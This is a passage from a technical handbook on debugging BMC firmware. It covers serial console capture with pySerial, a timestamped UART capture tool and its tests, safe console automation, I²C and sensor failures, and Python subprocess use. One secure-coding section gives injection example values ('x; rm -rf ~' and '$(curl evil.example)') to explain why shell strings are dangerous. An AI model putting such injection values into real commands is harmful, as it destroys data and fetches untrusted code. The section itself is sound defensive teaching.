lessons.body:
```code
ls -l /dev/ttyUSB* /dev/ttyACM*         # [RO] adapters (Linux names)
dmesg | grep -i tty | tail               # which device appeared when you plugged in
id | grep dialout                         # permission to open serial ports (Debian/Ubuntu)
picocom -b 115200 /dev/ttyUSB0           # exit: Ctrl+A then Ctrl+X
minicom -D /dev/ttyUSB0 -b 115200        # exit: Ctrl+A then X
screen /dev/ttyUSB0 115200               # exit: Ctrl+A then K
```

Only **one program** should open a serial port at a time; two readers will each receive part of the stream (“UART log capture stops midway” can be exactly this). On the BMC side, the host’s console is often reachable via **SOL** (serial over LAN) through IPMI, or via obmc-console, e.g. ipmitool -I lanplus -H <bmc> -U <user> -E sol activate (with -E, ipmitool reads the password from the IPMI_PASSWORD environment variable rather than the command line).

lessons.title: Boot sequence analysis from serial output
lessons.body:
A healthy BMC boot on serial typically shows, in order: bootloader banner (U-Boot version, SoC, DRAM, flash detection) → image loading → Starting kernel ... → kernel messages → systemd messages ( [ OK ] Started ...) → login prompt. Mark each milestone’s timestamp; compare with a baseline to spot new delays.

**Sample (fictional) failing boot — from the simulator’s sample file:**

```code
U-Boot 2019.04 (Oct 01 2026 - 10:00:00 +0000)
SOC: AST2600-A3
...
Starting kernel ...
[    0.000000] Booting Linux on physical CPU 0xf00
[    2.410533] lm75 3-0048: probe failed with error -121
[    3.551002] VFS: Mounted root (squashfs filesystem) readonly on device 31:4.
[  OK  ] Started Journal Service.
[FAILED] Failed to start Fake Sensor Daemon.
[   12.500123] Unable to handle kernel NULL pointer dereference at virtual address 00000008
[   12.500200] Internal error: Oops: 5 [#1] SMP ARM
[   12.500300] PC is at lab_sensor_read+0x2c/0x90
[   12.510000] Kernel panic - not syncing: Fatal exception
[   12.510100] Rebooting in 10 seconds..
U-Boot 2019.04 (Oct 01 2026 - 10:00:00 +0000)
```

Analysis: the kernel booted and systemd started; a kernel oops in a sensor read path became a panic, and the board rebooted (second U-Boot banner). None of this panic text would be in a volatile journal after the reboot — **only the serial capture has it**.

lessons.title: pySerial integration concepts
lessons.body:
pySerial is the standard Python library for serial ports.

```code
import serial                         # pip install pyserial
ser = serial.Serial("/dev/ttyUSB0", baudrate=115200, bytesize=8,
                    parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE,
                    timeout=0.5)       # read() returns after 0.5 s even with no data
data = ser.read(4096)                  # bytes; may be b"" on timeout
ser.close()
```

Key points:

- **Always set timeout** — without it, read() blocks forever.

- Data arrives as **bytes in arbitrary chunks**; lines can be split across reads. Buffer and split on b"\n"; strip \r.

- Decode with errors="replace" — boot noise and baud mismatches produce invalid UTF-8.

- serial.serial_for_url() accepts URLs: socket://host:port (raw TCP console servers such as ser2net), rfc2217://host:port (RFC 2217 serial-over-network), and loop:// (a loopback port — great for tests).

- Handle serial.SerialException (adapter unplugged, port busy).

lessons.title: Capturing logs with timestamps — a complete tool
lessons.body:
uart_capture.py captures from a real port, a pySerial URL, or a **replay file** (simulated stream). It timestamps every line (UTC and seconds since capture start), writes line-buffered so a crash loses nothing already received, reports silent periods, detects boot milestones and failure patterns, reconnects a bounded number of times, and returns a verdict.

```code
File: code/ch21/uart_capture.py
  #!/usr/bin/env python3
  """Timestamped serial-console capture with boot-event detection (Handbook Chapter 21).
  Read-only by default: it only listens. It never sends keystrokes unless you
  add that deliberately (see the handbook's "safe interactive commands" section).
  Sources:
    --port /dev/ttyUSB0      real serial port via pySerial (needs 'pip install pyserial')
    --port socket://host:p   network serial server (e.g. ser2net), via pySerial URL handlers
    --replay FILE            simulated stream: lines "<seconds>|<text>" (no hardware needed)
  Examples:
    python3 uart_capture.py --replay samples/boot_panic.txt --speed 20 -o cap.log
    python3 uart_capture.py --port /dev/ttyUSB0 --baud 115200 --duration 300 -o cap.log
  Exit codes: 0 expected end pattern seen (e.g. login prompt), 1 failure pattern seen
  or end pattern not seen, 2 usage/port error.
  """
  from __future__ import annotations
  import argparse
  import json
  import re
  import sys
  import time
  from datetime import datetime, timezone
  from pathlib import Path
  from typing import Iterator, List, Optional, Tuple
  DEFAULT_EVENTS = {
      "bootloader": r"U-Boot \d{4}\.\d{2}",
      "kernel_start": r"Starting kernel|Booting Linux",
      "systemd": r"systemd\[1\]: systemd \d+|Welcome to",
      "unit_failed": r"\[FAILED\]",
      "kernel_oops": r"Oops:|Unable to handle kernel",
    "kernel_panic": r"Kernel panic - not syncing",
    "watchdog": r"[Ww]atchdog",
    "login_prompt": r"login:\s*$",
}
FAILURE_EVENTS = {"kernel_oops", "kernel_panic"}
def utc() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds")
class ReplaySource:
    """Yields (line, None) with original relative timing scaled by 'speed'."""
    def __init__(self, path: Path, speed: float = 1.0):
        self.path, self.speed = path, max(speed, 0.001)
    def lines(self, idle_timeout: float) -> Iterator[Tuple[Optional[str], Optional[str]]]:
        start = time.monotonic()
        for raw in self.path.read_text(encoding="utf-8").splitlines():
            if raw.startswith("#") or "|" not in raw:
                continue
            t_str, text = raw.split("|", 1)
            due = start + float(t_str) / self.speed
            # Emit idle markers if the simulated gap exceeds idle_timeout.
            while True:
                wait = due - time.monotonic()
                if wait <= 0:
                    break
                if wait > idle_timeout:
                    time.sleep(idle_timeout)
                    yield None, f"no data for {idle_timeout:.1f}s"
                else:
                    time.sleep(wait)
            yield text, None
class SerialSource:
    """Reads lines from pySerial; reports idle periods; reconnects a bounded number of
times."""
    def __init__(self, url: str, baud: int, reconnects: int = 3):
        try:
            import serial  # noqa: F401  (imported lazily: optional dependency)
        except ImportError as exc:
            raise SystemExit("pySerial is required for --port (pip install pyserial)") from
exc
        self.url, self.baud, self.reconnects = url, baud, reconnects
    def _open(self):
        import serial
        # 8N1 is the common default for BMC consoles; check your platform documentation.
        return serial.serial_for_url(self.url, baudrate=self.baud, bytesize=8, parity="N",
                                     stopbits=1, timeout=0.5)
    def lines(self, idle_timeout: float):
        import serial
        attempts = 0
        buf = b""
        while True:
            try:
                ser = self._open()
            except serial.SerialException as exc:
                attempts += 1
                if attempts > self.reconnects:
                    raise
                yield None, f"open failed ({exc}); retry {attempts}/{self.reconnects}"
                time.sleep(2)
                continue
            last = time.monotonic()
            try:
                while True:
                    chunk = ser.read(4096)
                    if chunk:
                        last = time.monotonic()
                        buf += chunk
                        while b"\n" in buf:
                            line, buf = buf.split(b"\n", 1)
                            yield line.decode("utf-8", errors="replace").rstrip("\r"), None
                        if buf.endswith(b"login: ") or buf.endswith(b"login:"):
                            yield buf.decode("utf-8", errors="replace"), None   # prompt has
no newline
                            buf = b""
                    elif time.monotonic() - last > idle_timeout:
                        yield None, f"no data for {idle_timeout:.1f}s"
                        last = time.monotonic()
            except serial.SerialException as exc:
                attempts += 1
                yield None, f"serial error: {exc}"
                if attempts > self.reconnects:
                    raise
                time.sleep(2)
            finally:
                ser.close()
def capture(source, out: Path, duration: float, idle_timeout: float,
            end_event: str = "login_prompt", events=None) -> dict:
    patterns = {k: re.compile(v) for k, v in (events or DEFAULT_EVENTS).items()}
    found: List[dict] = []
    gaps: List[dict] = []
    t0 = time.monotonic()
    nlines = 0
    reason = "duration elapsed"
    with out.open("a", encoding="utf-8", buffering=1) as fh:   # line-buffered: survives
crashes
        fh.write(f"### capture start {utc()}\n")
        for line, note in source.lines(idle_timeout):
            rel = time.monotonic() - t0
            if note is not None:
                fh.write(f"{utc()} +{rel:9.3f} ### {note}\n")
                gaps.append({"t": round(rel, 3), "note": note})
            else:
                nlines += 1
                fh.write(f"{utc()} +{rel:9.3f} {line}\n")
                for name, rx in patterns.items():
                    if rx.search(line):
                        found.append({"event": name, "t": round(rel, 3), "line":
line.strip()})
                if any(e["event"] == end_event for e in found):
                    reason = f"end event '{end_event}' seen"
                    break
            if rel > duration:
                break
        else:
            reason = "source ended"
        fh.write(f"### capture stop {utc()} ({reason})\n")
    failures = [e for e in found if e["event"] in FAILURE_EVENTS]
    reached = any(e["event"] == end_event for e in found)
    return {"lines": nlines, "stop_reason": reason, "events": found, "gaps": gaps,
              "end_event_seen": reached, "failure_events": failures,
              "verdict": "PASS" if reached and not failures else "FAIL"}
  def main(argv=None) -> int:
      ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescription
  HelpFormatter)
      src = ap.add_mutually_exclusive_group(required=True)
      src.add_argument("--port", help="serial device or pySerial URL")
      src.add_argument("--replay", type=Path, help="simulated capture file")
      ap.add_argument("--baud", type=int, default=115200)
      ap.add_argument("--speed", type=float, default=1.0, help="replay speed factor")
      ap.add_argument("--duration", type=float, default=600, help="max capture seconds")
      ap.add_argument("--idle", type=float, default=10, help="report gaps longer than this")
      ap.add_argument("-o", "--output", type=Path, default=Path("uart_capture.log"))
      ap.add_argument("--summary", type=Path, help="write JSON summary here")
      args = ap.parse_args(argv)
      try:
          source = (ReplaySource(args.replay, args.speed) if args.replay
                    else SerialSource(args.port, args.baud))
          result = capture(source, args.output, args.duration, args.idle)
      except FileNotFoundError as exc:
          print(f"ERROR: {exc}", file=sys.stderr)
          return 2
      except Exception as exc:  # serial.SerialException and friends
          print(f"ERROR: capture failed: {type(exc).__name__}: {exc}", file=sys.stderr)
          return 2
      except KeyboardInterrupt:
          print("interrupted; partial capture kept in", args.output, file=sys.stderr)
          return 1
      print(json.dumps(result, indent=2))
      if args.summary:
          args.summary.write_text(json.dumps(result, indent=2), encoding="utf-8")
      return 0 if result["verdict"] == "PASS" else 1
  if __name__ == "__main__":
      sys.exit(main())
```

**Simulated stream input (fictional) — samples/boot_ok_with_gap.txt:**

```code
File: code/ch21/samples/boot_ok_with_gap.txt
  # FICTIONAL serial capture for practice. Format: <seconds since start>|<text>
  0.01|U-Boot 2019.04 (Oct 01 2026 - 10:00:00 +0000)
  1.90|Starting kernel ...
  2.10|[    0.000000] Booting Linux on physical CPU 0xf00
  6.00|[    4.200000] systemd[1]: systemd 255 running in system mode
  9.80|[  OK  ] Started Journal Service.
  10.50|[  OK  ] Reached target Multi-User System.
  21.00|Phosphor OpenBMC (Phosphor OpenBMC Project Reference Distro) falcon ttyS4
  21.01|
  21.02|falcon-bmc login:
Run: python3 uart_capture.py --replay samples/boot_ok_with_gap.txt --speed 5 --idle 1 -o
cap.log
```

```code
2026-10-15T08:23:49.655+00:00 +    0.002 U-Boot 2019.04 (Oct 01 2026 - 10:00:00 +0000)
2026-10-15T08:23:50.035+00:00 +    0.383 Starting kernel ...

2026-10-15T08:23:50.853+00:00 +    1.200 [    4.200000] systemd[1]: systemd 255 running in
system mode
2026-10-15T08:23:51.613+00:00 +    1.960 [  OK  ] Started Journal Service.
2026-10-15T08:23:51.753+00:00 +    2.100 [  OK  ] Reached target Multi-User System.
2026-10-15T08:23:52.754+00:00 +    3.101 ### no data for 1.0s
2026-10-15T08:23:53.754+00:00 +    4.101 ### no data for 1.0s
2026-10-15T08:23:53.853+00:00 +    4.200 Phosphor OpenBMC (Phosphor OpenBMC Project Reference
Distro) falcon ttyS4
2026-10-15T08:23:53.855+00:00 +    4.202
2026-10-15T08:23:53.857+00:00 +    4.204 falcon-bmc login:
### capture stop 2026-10-15T08:23:53.857+00:00 (end event 'login_prompt' seen)
```

Tests (including one that drives the real pySerial code path through the loop:// URL):

```code
File: code/ch21/test_uart_capture.py
  from pathlib import Path
  import uart_capture as uc
  SAMPLES = Path(__file__).parent / "samples"
  def test_panic_capture_detects_failure(tmp_path):
      src = uc.ReplaySource(SAMPLES / "boot_panic.txt", speed=200)
      res = uc.capture(src, tmp_path / "cap.log", duration=60, idle_timeout=5)
      events = [e["event"] for e in res["events"]]
      assert "kernel_panic" in events and "kernel_oops" in events
      assert res["verdict"] == "FAIL" and not res["end_event_seen"]
      assert events.count("bootloader") == 2          # the reboot is visible
  def test_ok_boot_reaches_login_and_records_gap(tmp_path):
      src = uc.ReplaySource(SAMPLES / "boot_ok_with_gap.txt", speed=20)
      res = uc.capture(src, tmp_path / "cap.log", duration=60, idle_timeout=0.3)
      assert res["verdict"] == "PASS"
      assert res["gaps"], "the 10.5s->21.0s silence should be reported"
      text = (tmp_path / "cap.log").read_text()
      assert "### no data for" in text and "login:" in text
  def test_cli_replay(tmp_path):
      rc = uc.main(["--replay", str(SAMPLES / "boot_panic.txt"), "--speed", "500",
                    "-o", str(tmp_path / "c.log"), "--summary", str(tmp_path / "s.json")])
      assert rc == 1 and (tmp_path / "s.json").exists()
  def test_cli_missing_file(tmp_path):
      assert uc.main(["--replay", str(tmp_path / "nope.txt"), "-o", str(tmp_path / "c.log")]) =
  = 2
  def test_serial_loopback_url(tmp_path):
      """pySerial's loop:// URL echoes written bytes back - exercises SerialSource without
  hardware."""
      import serial
      import threading
      src = uc.SerialSource("loop://", 115200)
      # Wrap _open so we can inject data into the loopback port after opening.
      orig_open = src._open
      def _open():
          ser = orig_open()
          threading.Timer(0.2, lambda: ser.write(b"U-Boot 2019.04 test\r\nfalcon-bmc login: "))
  .start()
          return ser
      src._open = _open
      res = uc.capture(src, tmp_path / "cap.log", duration=5, idle_timeout=1)
      assert res["verdict"] == "PASS" and isinstance(serial.__version__, str)
```

All five tests passed in the author’s environment with pySerial 3.5. **The --port path**

**has been exercised only through loop://, not with a physical adapter.**

lessons.title: Safe command execution through interactive consoles
lessons.body:
Automating a console (sending commands and reading results) is useful — e.g. collecting ip addr when the network is down — but dangerous if done carelessly. Rules:

1. **Detect the prompt; never assume it.** Prompts differ ( root@falcon-bmc:~#, falcon-bmc login:, => U-Boot, # BusyBox, host OS prompts). Match patterns configured per platform.

2. **Know which context you’re in.** Typing Linux commands into **U-Boot** can modify the boot environment ( setenv, saveenv, erase are destructive). Stop if the prompt doesn’t match.

3. **Allow-list commands** (read-only diagnostics only).

4. **Wait for completion with a timeout** — detect the next prompt or a unique end `marker: ip -br addr; echo __DONE_42__.`

5. **Never send credentials into a log.** Mask them in captures; prefer key-based access over the network instead of console logins in automation.

6. **Don’t interrupt the boot** (e.g. pressing a key during U-Boot’s autoboot countdown stops booting) unless that’s the test.

A minimal pattern (concept; adapt prompts and add error handling):

```code
import re, time
def run_console_cmd(ser, cmd, prompt=re.compile(rb"root@[\w-]+:[^#]*# $"), timeout=10):
    """Send one allow-listed command; return its output. ser: an open pySerial port."""
    ALLOWED = {"uname -a", "ip -br addr", "uptime", "df -h", "systemctl --failed --no-pager"}
    if cmd not in ALLOWED:
        raise ValueError(f"command not allowed on console: {cmd}")
    marker = f"__END_{int(time.time())}__"
    ser.reset_input_buffer()
    ser.write(f"{cmd}; echo {marker}\n".encode())
    buf, deadline = b"", time.monotonic() + timeout
    while time.monotonic() < deadline:
        buf += ser.read(4096)
        # The marker appears twice: once in the echoed command, once as output.
        if buf.count(marker.encode()) >= 2 and prompt.search(buf):
            break
    else:
        raise TimeoutError(f"no completion marker within {timeout}s")
    text = buf.decode(errors="replace")
    return text.split(marker, 1)[1].split(marker, 1)[0]
```

(The echoed command line contains the marker once; the output contains it again — so we wait for two occurrences.) This snippet is **illustrative and was not executed against a real console**.

lessons.title: Exercises
lessons.body:
1. What do 115200 8N1 mean?

2. The capture shows two U-Boot banners 26 s apart with a kernel panic in between. What is your report?

3. Why must a serial capture tool write line-buffered output?

4. Explain why console automation must recognise the U-Boot prompt.

**Solutions**

1. 115200 baud, 8 data bits, no parity, 1 stop bit.

2. “Kernel oops in lab_sensor_read during boot escalated to panic and auto-reboot (boot loop suspected). First error: probe failure of 3-0048 at 2.41 s, then NULL pointer dereference at 12.50 s. Evidence: serial capture. Root cause not yet confirmed; leading hypothesis: driver does not handle failed probe/missing device.”

3. So that data already received is on disk if the tool, host or device crashes.

4. U-Boot accepts commands that modify the boot environment or flash; sending Linux commands there can be destructive and the automation would also misinterpret the state.

lessons.title: I²C communication failures
lessons.body:
**I²C basics:** a two-wire bus (SDA data, SCL clock) shared by many devices, each with a 7-bit address. A master (BMC’s I²C controller) sends a start condition, the address, and waits for the device to **ACK**. Muxes (e.g. PCA954x) switch between bus segments — Linux exposes each mux channel as an additional i2c-N adapter.

| Error | errno | Meaning |
| NACK on address | -ENXIO (-6) or -EREMOTEIO | No device acknowledged: |
| (-121), driver-dependent | absent, unpowered, wrong address, behind a mux channel not selected, bus fault |
| Error | errno | Meaning |
| Timeout | -ETIMEDOUT (-110) | Transaction didn’t complete: bus stuck (SDA held low), clock stretching too long, controller issue |
| Arbitration lost | -EAGAIN (-11) | Another master on the bus (multi-master systems) |
| Bus recovery failed | (log message) | Controller couldn’t free a stuck bus |

**Investigation (read-only first):**

```code
dmesg | grep -iE 'i2c|smbus' | tail -50
ls /sys/bus/i2c/devices/                       # adapters and instantiated devices
cat /sys/bus/i2c/devices/i2c-3/name            # which controller/mux channel
ls -l /sys/bus/i2c/devices/3-0048/driver       # bound?
cat /sys/bus/i2c/devices/3-0048/name
```

**Hypothesis tests** (lab, with approval for anything beyond reads):

- Do other devices on the same bus also fail? (all fail → bus/controller/mux/power; one fails → that device)

- Does the failure follow the board/riser/cable when swapped?

- Does it correlate with host power state? (devices powered from host rails disappear when the host is off — **expected behaviour**, not a fault)

- Does it correlate with temperature or time since boot?

- Is the device present in the board’s configuration for this revision?

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Device discovery failures
lessons.body:
Device present in hardware but missing in Linux, D-Bus or Redfish. Check each stage:

1. **Described?** In the device tree ( /proc/device-tree) or instantiated by configuration (entity-manager can create I²C devices from JSON).

2. **Probed?** dmesg probe messages; driver symlink in sysfs.

3. **Exposed?** hwmon entry, device node.

4. **Published?** D-Bus object ( busctl tree of the sensor/inventory daemon).

5. **Associated?** Redfish shows it under the right chassis (associations via ObjectMapper).

The first stage that’s missing is where to dig. This is the systematic answer to “a device appears in one diagnostic interface but not another”.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Sensor reading anomalies
lessons.body:
| Anomaly | Possible causes |
| null /NaN | Read failure; sensor marked unavailable; host-powered sensor while host off |
| Anomaly | Possible causes |
| Stuck value (never changes) | Cached value after read errors; daemon hung; device stuck |
| Wrong scale (e.g. 24500 °C) | Missing scaling factor in config (millidegrees not divided) |
| Wrong sign/offset | Config error or device configuration |
| Noisy/spiky | Electrical noise, bus errors returning garbage, real fluctuations |
| Out of range threshold alarms | Real condition or wrong thresholds |

Compare **raw sysfs**, **D-Bus**, **Redfish** and, ideally, an **independent reference** (thermocouple, PSU’s own reporting). Two layers agreeing with each other but not with reality points to the device or its configuration.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Driver and service interactions
lessons.body:
- A daemon polling a slow or failing device can block ( D state) → D-Bus calls to it time out → Redfish 503s. The root is lower than the visible failure.

- A driver that floods the kernel log with errors can fill a volatile journal and evict useful history.

- Services that start before devices are ready (ordering) may cache “absent” until restarted — appears as “works after a service restart” (a strong clue for a race).

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Unexpected resets and watchdog events
lessons.body: Classify the reset: **requested** (logged reboot request), **watchdog** (no shutdown sequence; reset cause registers if available), **power** (both BMC and host lost power; PSU/AC events), **panic** (serial shows panic). Then find what preceded it: memory trend (OOM), CPU lockup messages, a hung daemon that systemd’s service watchdog killed, flash errors.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Firmware compatibility issues
lessons.body:
- BMC image built for a different board revision (device tree or configs don’t match hardware).

- Device firmware (PSU, NIC, CPLD) versions incompatible with the BMC’s expectations — e.g. a PLDM-capable device with firmware that reports different sensor PDRs.

- Host firmware (BIOS) and BMC disagreements on interfaces (IPMI OEM commands, eSPI/LPC configuration).

Verify with a **version matrix**: record all component versions with every test result. Many “random” bugs are version combinations.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Intermittent failures
lessons.body:
Strategy:

1. **Measure frequency** — “fails 3 of 100 reboots” is a fact; “sometimes fails” is not.

2. **Maximise evidence per occurrence** — continuous serial capture, persistent logging (in the lab), resource sampling, timestamps.

3. **Find correlations** — time since boot, temperature, host power state, concurrent tests, network load, specific boards.

4. **Stress to increase frequency** — repeated reboots, load, temperature (with the hardware team).

5. **Change one variable at a time** and compare failure rates with enough runs to be meaningful. If baseline failure rate is 3%, 20 passing runs prove little: the chance of 20 passes even if nothing changed is 0.97^20 ≈ 54%.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Test-environment problems
lessons.body: Before reporting a product bug, rule out: wrong device under test (IP reassigned), stale credentials or host keys after reflash, concurrent jobs on the same BMC, lab network issues (switch, VLAN), CI agent resource exhaustion, time skew between host and BMC, test code bugs (wrong exit status, race in polling). Run the failing test **manually from the same agent** and from another machine to separate environment from product.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures

lessons.title: Building a root-cause hypothesis from evidence
lessons.body:
**Template:**

```code
Symptom      : what was observed, where, when (UTC), how often
First error  : earliest abnormal evidence, with source and timestamp
Chain        : how the first error leads to the symptom
Hypotheses   : H1, H2, H3 (at least two)
Tests        : for each H, an observation that would CONFIRM and one that would REJECT it
Result       : which tests were run, outcomes
Conclusion   : confirmed cause / leading hypothesis (state confidence honestly)
```

source.section: 22.10 Building a root-cause hypothesis from evidence

lessons.title: Case study A (fictional): TEMP_INLET intermittently null
lessons.body:
**Symptom:** In 3 of 50 test runs, Redfish TEMP_INLET is null for ~10 s. **First error:** i2c i2c-3: transfer timed out (kernel) 0.2 s before daemon read error.

| Hypothesis | Confirming evidence | Rejecting evidence |
| H1: Sensor device intermittently | Errors only for 3-0048; other | Errors on all devices on bus 3 |
| NACKs/hangs | devices on i2c-3 fine; follows the board when sensor board swapped |
| H2: Bus contention/stuck bus | All devices on i2c-3 time out | Only one address affected |
| from another device | together; recovery messages |
| Hypothesis | Confirming evidence | Rejecting evidence |
| H3: Driver/controller bug under | Timeouts correlate with another | Timeouts with no concurrent |
| concurrent access | daemon polling bus 3 at the | activity same moment; disappears when polling schedule changes |
| H4: Test environment (power | Failures coincide with host | Failures with host steadily on |
| cycling host during test) | power transitions in the test sequence (sensor on host power rail) |

**Investigation:** correlate timestamps of timeouts with other devices’ errors and with host power events (journal); check whether all 3 failing runs share a board; review concurrent pollers. **Outcome (fictional):** All 3 failures occurred within 2 s of a host power-on; the sensor is on a host-powered rail and the daemon read it before power-good. **Confirmed** by reproducing 10/10 with reads timed right after power-on, and 0/50 when waiting for power-good. **Cause:** sensor read ordering versus power state (configuration/firmware), not faulty hardware.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures
source.section: 22.11 Case study A (fictional): TEMP_INLET intermittently null

lessons.title: Case study B (fictional): fan reads 0 RPM on one board only
lessons.body: **Hypotheses:** fan not populated (expected), tach wiring/connector, fan failed, PWM/ tach mapping config wrong for this board revision. **Discriminating tests:** visual inspection/fan audibly spinning (record by hardware team) → if spinning but 0 RPM, not “fan failed”; swap fans between connectors → reading follows connector = wiring/ mapping; check board revision vs config. **Outcome (fictional):** Board rev B uses a different tach channel; image config mapped rev A channels. Confirmed by reading the alternate tach channel in sysfs showing 8300 RPM.

source.chapter: 22 Debugging Embedded Hardware and Firmware Failures
source.section: 22.12 Case study B (fictional): fan reads 0 RPM on one board only

lessons.title: Case study C (fictional): BMC resets every ~36 hours
lessons.body: **Evidence:** previous-boot journals end abruptly; serial shows no panic; resets coincide with a daemon’s RSS reaching ~300 MB (resource sampling); kernel log before the last reset shows OOM kills of several processes and then silence. **Hypotheses:** memory leak → OOM → critical service killed → hardware watchdog reset (systemd/kernel unable to pet in time) vs. hardware watchdog bug vs. power glitch. **Tests:** shorten the cycle by increasing load on the leaking daemon (reset arrives sooner = supports H1); stop the leaking daemon on a lab unit for 72 h (no resets = strong support). **Conclusion format:** “Confirmed: leak in daemon X (≈8 MB/h) leads to OOM ~36 h after boot; subsequent watchdog reset. Fix verified: 7-day soak with patched build, RSS flat.”

lessons.title: Exercises
lessons.body:
1. A PSU sensor is present in sysfs but missing from Redfish. Which stages do you check?

2. How many consecutive passes do you need to claim, with ~95% confidence, that a fix reduced a 10% failure rate to below 10%?

3. Give two environment causes for “SSH host key changed” failures after a firmware update test.

**Solutions**

1. D-Bus publication ( busctl tree of the relevant sensor daemon; is the object there with valid Value?), associations/ObjectMapper (is it associated with the chassis?), and bmcweb’s mapping for that sensor type; also the daemon’s journal and configuration.

2. Solve 0.9^n ≤ 0.05 → n ≥ 29 (0.9^29 ≈ 0.047). About 29 consecutive passes.

3. The BMC was reflashed and generated new host keys (expected); or the IP now belongs to a different device (environment/lab inventory error).

lessons.title: When to use Bash and when to use Python
lessons.body:
| Use Bash when… | Use Python when… |
| Gluing a few commands together; < ~100 lines | Logic, data structures, error handling grow |
| Running on a minimal target (no Python on the | Parsing JSON/XML, HTTP APIs, serial protocols |

BMC)

| Startup scripts, CI glue, one-off collection | You need unit tests, mocking, reuse, packaging |
| Text streams fit grep/awk naturally | Concurrency, retries with state, complex reports |

A common, effective pattern: **Python on the test host orchestrates**; **simple shell commands run on the device**; Python parses the raw output.

source.section: 23.1 When to use Bash and when to use Python

lessons.title: Running commands with subprocess
lessons.body:
subprocess.run() (Python 3.5+) is the main API. Arguments explained:

```code
import subprocess
cp = subprocess.run(
    ["systemctl", "is-active", "sshd"],   # 1. argument LIST: program + args
    capture_output=True,                  # 2. capture stdout and stderr (3.7+)
    text=True,                            # 3. decode bytes to str (locale encoding)
    timeout=10,                           # 4. seconds; raises TimeoutExpired
    check=False,                          # 5. don't raise on non-zero exit
)
print(cp.returncode, cp.stdout.strip(), cp.stderr.strip())
```

- cp.returncode — exit status (negative -N if killed by signal N).

- check=True raises CalledProcessError on non-zero exit (has `.returncode, .stdout, .stderr).`

- On timeout, the child is **killed** and TimeoutExpired is raised (with any partial output `in .stdout/ .output).`

- FileNotFoundError if the program doesn’t exist; PermissionError if not executable.

- errors="replace" (3.6+ with text=True) avoids UnicodeDecodeError on odd bytes.

- env={...} replaces the environment entirely; cwd= sets the working directory.

lessons.title: Argument lists versus shell command strings
lessons.body:
```code
# SAFE: each argument is passed to the program as-is. No shell is involved.
subprocess.run(["grep", "-c", pattern, logfile], capture_output=True, text=True)
# DANGEROUS: a shell parses the string. Any shell syntax inside variables executes.
subprocess.run(f"grep -c {pattern} {logfile}", shell=True)
```

If pattern came from a test parameter, a config file, a device name or an API response containing x; rm -rf ~ or $(curl evil.example), the second form **runs that code**. This is **command injection**. Also, with shell=True, spaces in filenames break commands and quoting becomes error-prone. If you truly need shell features (pipes, globbing), prefer doing them in Python ( pathlib.glob, reading files, chaining two subprocess.run calls). If you must build a shell string, quote every value with shlex.quote() — and treat that as a code smell. **Remote commands over SSH** are also shell strings — the remote side runs them through the user’s shell. Never interpolate untrusted values into them; use fixed, allow-listed commands, or quote with shlex.quote().


lessons.title: Logging and exception handling
lessons.body:
```code
import logging
log = logging.getLogger("diag")
logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log.info("collecting from %s", "falcon-bmc")        # lazy % formatting
try:
    ...
except TimeoutError:
    log.warning("BMC did not answer in time")         # expected failure: warning
except Exception:
    log.exception("unexpected error")                  # includes traceback
    raise
```

- Use logging (levels, timestamps, module names) instead of print for diagnostics; send logs to **stderr** and reports to **stdout/files**.

- Catch **specific** exceptions you can handle; let unexpected ones surface (or catch at the top level to save partial results, then re-raise or exit non-zero).

- Never log secrets; don’t log full HTTP headers with Authorization.

lessons.title: A reusable module: safe_exec.py
lessons.body:
```code
File: code/ch23/safe_exec.py
  """safe_exec.py - a small, reusable helper for running commands from Python (Chapter 23)."""
  from __future__ import annotations
  import json
  import logging
  import shlex
  import subprocess
  from dataclasses import dataclass
  from typing import Optional, Sequence
  log = logging.getLogger(__name__)
  class CommandError(RuntimeError):
      """Raised by run(check=True) when a command fails, times out or cannot start."""
      def __init__(self, message: str, result: "Result"):
          super().__init__(message)
          self.result = result
  @dataclass
  class Result:
      argv: list
      returncode: Optional[int]
      stdout: str
      stderr: str
      timed_out: bool = False
      @property
      def ok(self) -> bool:
          return self.returncode == 0 and not self.timed_out
  def run(argv: Sequence[str], timeout: float = 30, check: bool = False,
          input_text: Optional[str] = None, cwd: Optional[str] = None) -> Result:
      """Run a command given as an argument list. Never uses a shell.
      Returns a Result. With check=True, raises CommandError on failure instead.
      """
      if isinstance(argv, str):
          raise TypeError("pass an argument list, not a shell string (see Chapter 23)")
      argv = [str(a) for a in argv]
      log.debug("running: %s", shlex.join(argv))
      try:
          cp = subprocess.run(argv, capture_output=True, text=True, errors="replace",
                              timeout=timeout, input=input_text, cwd=cwd, check=False)
          res = Result(argv, cp.returncode, cp.stdout, cp.stderr)
      except subprocess.TimeoutExpired as exc:
          out = exc.stdout.decode(errors="replace") if isinstance(exc.stdout, bytes) else
  (exc.stdout or "")
          res = Result(argv, None, out, f"timed out after {timeout}s", timed_out=True)
      except FileNotFoundError:
          res = Result(argv, 127, "", f"command not found: {argv[0]}")
      except PermissionError as exc:
          res = Result(argv, 126, "", f"permission denied: {exc}")
      level = logging.DEBUG if res.ok else logging.WARNING
      log.log(level, "%s -> rc=%s timed_out=%s", argv[0], res.returncode, res.timed_out)
      if check and not res.ok:
          raise CommandError(f"{shlex.join(argv)} failed (rc={res.returncode}): "
                             f"{res.stderr.strip()[:200]}", res)
      return res
  def run_json(argv: Sequence[str], timeout: float = 30):
      """Run a command whose stdout is JSON (e.g. 'ip -j addr', 'lsblk -J') and parse it."""
      res = run(argv, timeout=timeout, check=True)
      try:
          return json.loads(res.stdout)
      except json.JSONDecodeError as exc:
          raise CommandError(f"invalid JSON from {argv[0]}: {exc}", res) from exc
```

Tests (including a mock-based test that verifies the exact call arguments and a test proving hostile input isn’t interpreted):

```code
File: code/ch23/test_safe_exec.py
  import subprocess
  import sys
  from unittest import mock
import pytest
import safe_exec as se
PY = sys.executable
def test_success_captures_output():
